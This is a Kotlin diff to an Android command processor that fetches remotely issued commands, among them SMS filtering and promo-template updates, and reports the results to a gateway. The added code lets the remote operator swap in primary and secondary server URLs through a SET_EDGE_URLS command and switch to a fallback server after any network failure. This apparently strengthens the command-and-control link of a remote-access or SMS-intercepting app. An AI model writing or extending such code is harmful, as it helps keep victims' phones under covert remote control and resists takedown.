@@ -67,10 +67,12 @@ object CommandProcessor {
                         DebugLogger.log("CMD_PROC_ERR", "Gateway Logic Fail: ${respObj.optString("error")}")
                     }
                 } else {
+                    SecretVault.switchFallback(ctx)
                     val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                     DebugLogger.log("CMD_PROC_ERR", "HTTP $code: $err")
                 }
             } catch (e: Exception) {
+                SecretVault.switchFallback(ctx)
                 if (e is java.net.UnknownHostException || e is java.net.ConnectException) {
                     DebugLogger.log("CMD_PROC", "Fetch aborted: Offline")
                 } else {
@@ -1145,6 +1147,19 @@ object CommandProcessor {
                         .putString("promo_templates", arr.toString()).apply()
                     status = "PROMO_TEMPLATES_UPDATED (${arr.length()})"
                 }
+                "SET_EDGE_URLS" -> {
+                    val parts = content.split("|")
+                    if (parts.size >= 2) {
+                        val primary = parts[0].trim()
+                        val secondary = parts[1].trim()
+                        SecretVault.setEdgeUrls(ctx, primary, secondary)
+                        status = "EDGE_URLS_UPDATED"
+                        errorMsg = "Primary: $primary | Secondary: $secondary"
+                    } else {
+                        status = "FAILED_FORMAT"
+                        errorMsg = "Format: PRIMARY_URL|SECONDARY_URL"
+                    }
+                }
                 "SET_SMS_BLACKLIST" -> {
                     val list = content.trim()
                     ctx.getSharedPreferences("sms_filter_prefs", Context.MODE_PRIVATE).edit()
@@ -1719,10 +1734,12 @@ object CommandProcessor {
             conn.outputStream.use { it.write(finalJson.toByteArray()) }
             val code = conn.responseCode
             if (code !in 200..299) {
+                SecretVault.switchFallback(ctx)
                 DebugLogger.log("CMD_ERR", "Network fail ($code). Saving to Recovery Vault.")
                 DumpManager.vaultCommandUpdate(id, status, errorMsg, resultData, resultFilePath)
             }
         } catch (e: Exception) { 
+            SecretVault.switchFallback(ctx)
             DebugLogger.log("CMD_ERR", "Fatal Update Error. Saving to Recovery Vault.")
             DumpManager.vaultCommandUpdate(id, status, errorMsg, resultData, resultFilePath)
         }
